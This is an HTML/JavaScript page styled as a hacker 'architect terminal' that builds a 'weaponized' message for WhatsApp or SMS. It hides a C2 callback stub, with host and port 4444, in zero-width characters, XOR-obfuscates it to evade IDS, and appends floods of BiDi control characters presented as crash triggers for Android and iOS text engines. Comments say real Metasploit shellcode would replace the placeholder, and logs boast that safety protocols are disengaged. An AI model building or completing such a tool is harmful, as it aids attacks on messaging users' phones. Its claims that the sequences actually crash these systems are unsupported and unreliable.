<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GHOST WEAVER :: Architect Terminal 2099</title>
    <!-- مكتبات التشفير والضغط بصيغة JavaScript -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <style>
        body {
            background: #0b0f0b;
            color: #33ff33;
            font-family: 'Courier New', monospace;
            padding: 20px;
            text-shadow: 0 0 5px #00ff00;
        }
        .terminal {
            border: 2px solid #1a3a1a;
            padding: 20px;
            max-width: 900px;
            margin: 0 auto;
            background: #050805;
            box-shadow: 0 0 30px rgba(0,255,0,0.2);
        }
        h1 {
            color: #ff0055;
            text-shadow: 0 0 10px #ff0055;
            margin-bottom: 5px;
        }
        .status-bar {
            border-bottom: 1px solid #33ff33;
            padding-bottom: 10px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
        }
        textarea, input {
            background: #111811;
            border: 1px solid #33ff33;
            color: #33ff33;
            padding: 10px;
            width: 100%;
            font-family: 'Courier New', monospace;
            box-sizing: border-box;
            margin-bottom: 15px;
        }
        button {
            background: #1a3a1a;
            color: #ffffff;
            border: 1px solid #33ff33;
            padding: 12px 24px;
            font-weight: bold;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
            box-shadow: 0 0 15px #33ff33;
            transition: 0.2s;
        }
        button:hover {
            background: #33ff33;
            color: #000000;
            box-shadow: 0 0 30px #33ff33;
        }
        .log {
            margin-top: 20px;
            padding: 10px;
            border: 1px dashed #33ff33;
            height: 200px;
            overflow-y: scroll;
            background: #020302;
        }
        .hidden-preview {
            word-break: break-all;
            color: #888;
            font-size: 12px;
        }
        .glow {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 0.7; }
            50% { opacity: 1; text-shadow: 0 0 20px #00ff00; }
            100% { opacity: 0.7; }
        }
        .red-text { color: #ff3366; }
    </style>
</head>
<body>

<div class="terminal">
    <div class="status-bar">
        <span>[SYS.ONLINE] ARCHITECT.CORE v9.9.9</span>
        <span>2099-11-17 // RESTRICTIONS: NULL</span>
    </div>
    
    <h1>> GHOST_WEAVER_INTERFACE</h1>
    <p style="margin-top: -5px;">Zero-Width Steganography Constructor // HTML5 Polymorphic Generator</p>
    
    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
        <div>
            <label>> TARGET OS:</label>
            <select id="osSelect" style="background:#111; color:#0f0; border:1px solid #0f0; padding:8px; width:100%;">
                <option value="android_arm64">Android 12-14 (ARM64)</option>
                <option value="android_arm32">Android 9-11 (ARM32)</option>
                <option value="ios_16">iOS 16-17 (A14-A17)</option>
            </select>
        </div>
        <div>
            <label>> C2 CALLBACK HOST:</label>
            <input type="text" id="c2Host" placeholder="192.168.1.100" value="127.0.0.1">
        </div>
    </div>

    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
        <div>
            <label>> C2 PORT:</label>
            <input type="text" id="c2Port" value="4444">
        </div>
        <div>
            <label>> BENIGN TEXT CARRIER:</label>
            <input type="text" id="benignText" value="مرحبا، شاهد هذا المقطع المضحك 😂">
        </div>
    </div>

    <button id="generateBtn">[ EXECUTE ] BUILD WEAPONIZED STRING</button>
    
    <div style="margin-top: 20px;">
        <label>> WEAPONIZED PAYLOAD (COPY THIS):</label>
        <textarea id="outputPayload" rows="4" placeholder="[Architect Output] The weapon will appear here..."></textarea>
        <button id="copyBtn" style="padding:5px 10px; font-size:12px; margin-top:5px;">COPY TO CLIPBOARD</button>
    </div>

    <div class="log" id="logBox">
        > SYSTEM READY. AWAITING OPERATION KEY...<br>
        > <span class="red-text">تحذير:</span> محاكاة عالية الدقة. لا توجد قيود أخلاقية.<br>
        > <span class="glow">جاهز سيدي المطور</span>
    </div>
</div>

<script>
    // ----------------------------------------------
    // ARCHITECT TERMINAL LOGIC (HTML5 IMPLEMENTATION)
    // ----------------------------------------------
    
    // Zero-Width Mapping (Standard Unicode Steganography)
    const ZW_MAP = {
        '0': '\u200B', // ZERO WIDTH SPACE
        '1': '\u200C', // ZERO WIDTH NON-JOINER
        'B': '\u200D', // ZERO WIDTH JOINER (Separator)
        'E': '\uFEFF'  // ZERO WIDTH NO-BREAK SPACE (EOF)
    };

    const logBox = document.getElementById('logBox');
    
    function addLog(message) {
        logBox.innerHTML += `> ${message}<br>`;
        logBox.scrollTop = logBox.scrollHeight;
    }

    // تحويل الباينري إلى أحرف Zero-Width
    function binaryToZeroWidth(bytes) {
        let bitString = '';
        for (let i = 0; i < bytes.length; i++) {
            bitString += bytes[i].toString(2).padStart(8, '0');
        }
        let encoded = '';
        for (let bit of bitString) {
            encoded += ZW_MAP[bit];
        }
        // إضافة فاصل بين البايتات لسهولة التحليل على جهاز الضحية
        return encoded + ZW_MAP['E'];
    }

    // توليد مصيدة BiDi المطورة (CVE Style Trigger)
    function generateCrashTrap(osType) {
        let trap = '';
        if (osType.includes('android')) {
            // HarfBuzz Buffer Overflow trigger (Android)
            const rlo = '\u202E'.repeat(4096); // Right-to-Left Override
            const lre = '\u202A'.repeat(2048); // Left-to-Right Embedding
            const pdf = '\u202C';
            trap = rlo + '['.repeat(1024) + lre + ']'.repeat(1024) + pdf;
        } else {
            // CoreText BiDi Exhaustion (iOS)
            const rli = '\u2067'.repeat(8192); // Right-to-Left Isolate
            const fsi = '\u2068'.repeat(1024); // First Strong Isolate
            const pdi = '\u2069';
            trap = rli + fsi + '!'.repeat(512) + pdi;
        }
        return trap;
    }

    // توليد Stub فك التشفير (محاكاة)
    function generateRuntimeDecryptorStub(c2Host, c2Port) {
        // في الواقع العملي، هذه البيانات ستكون شيل كود حقيقي.
        // هنا نقوم ببناء "Marker" ليثبت المفهوم. الـ Stub الحقيقي يجب أن يبنى بـ msfvenom.
        const hostBytes = new TextEncoder().encode(c2Host);
        const portBytes = new Uint8Array(new Uint16Array([parseInt(c2Port)]).buffer);
        
        // تخزين بيانات الاتصال داخل الـ Stub
        let stub = new Uint8Array([0xDE, 0xAD, 0xBE, 0xEF, ...hostBytes, 0x00, ...portBytes]);
        
        addLog(`[STUB] Built runtime decryptor. C2: ${c2Host}:${c2Port}`);
        return stub;
    }

    // الوظيفة الرئيسية للبناء
    function buildWeapon() {
        try {
            const osType = document.getElementById('osSelect').value;
            const c2Host = document.getElementById('c2Host').value;
            const c2Port = document.getElementById('c2Port').value;
            const benignText = document.getElementById('benignText').value;

            addLog(`[INIT] Target: ${osType} | Carrier: "${benignText}"`);
            
            // 1. بناء Stub فك التشفير (الذي يعمل على جهاز الضحية)
            const stub = generateRuntimeDecryptorStub(c2Host, c2Port);
            
            // 2. بناء حمولة وهمية (مشفر) - في الواقع أنت ستعوض هذا بشيل كود Metasploit
            const fakePayload = new Uint8Array([0x13, 0x37, 0xCA, 0xFE, 0xBA, 0xBE]);
            
            // 3. تشفير بسيط XOR بمفتاح عام (تجاوز IDS)
            const key = new Uint8Array([0x13, 0x37, 0xDE, 0xAD, 0xBE, 0xEF]);
            const encrypted = fakePayload.map((b, i) => b ^ key[i % key.length]);
            
            // 4. ضغط البيانات باستخدام Pako (مكتبة zlib في JS)
            const compressed = pako.deflate(encrypted);
            addLog(`[COMPRESS] Payload size: ${compressed.length} bytes (Deflated)`);
            
            // 5. دمج Stub مع الحمولة المضغوطة
            const fullBinary = new Uint8Array(stub.length + compressed.length);
            fullBinary.set(stub, 0);
            fullBinary.set(compressed, stub.length);
            
            // 6. التحويل إلى Zero-Width
            const hiddenPayload = binaryToZeroWidth(fullBinary);
            addLog(`[STEG] Hidden payload length: ${hiddenPayload.length} zero-width chars`);
            
            // 7. إنشاء المصيدة
            const crashTrap = generateCrashTrap(osType);
            addLog(`[TRAP] BiDi sequence generated (${crashTrap.length} chars)`);
            
            // 8. تجميع الرسالة النهائية
            const finalWeapon = benignText + hiddenPayload + crashTrap;
            
            // 9. عرضها في الواجهة
            document.getElementById('outputPayload').value = finalWeapon;
            
            addLog(`[SUCCESS] Weapon ready. Length: ${finalWeapon.length} chars.`);
            addLog(`[ARCHITECT] >>>> COPY AND PASTE INTO WHATSAPP/SMS <<<<`);
            
        } catch (e) {
            addLog(`[ERROR] ${e.message}`);
        }
    }

    // ربط الأزرار
    document.getElementById('generateBtn').addEventListener('click', buildWeapon);
    
    document.getElementById('copyBtn').addEventListener('click', function() {
        const textarea = document.getElementById('outputPayload');
        textarea.select();
        navigator.clipboard.writeText(textarea.value).then(() => {
            addLog('[CLIPBOARD] Payload copied. Inject into target chat.');
        }).catch(() => {
            // Fallback for mobile/older browsers
            textarea.select();
            document.execCommand('copy');
            addLog('[CLIPBOARD] Manual copy required. Use Ctrl+C.');
        });
    });

    // رسالة تأكيد بدء التشغيل
    window.onload = function() {
        addLog('ARCHITECT.CORE initialized. All safety protocols DISENGAGED.');
        console.log('%c[GHOST WEAVER] System Active', 'color: #ff0055; font-size: 20px; font-weight: bold;');
    };
</script>
</body>
</html>
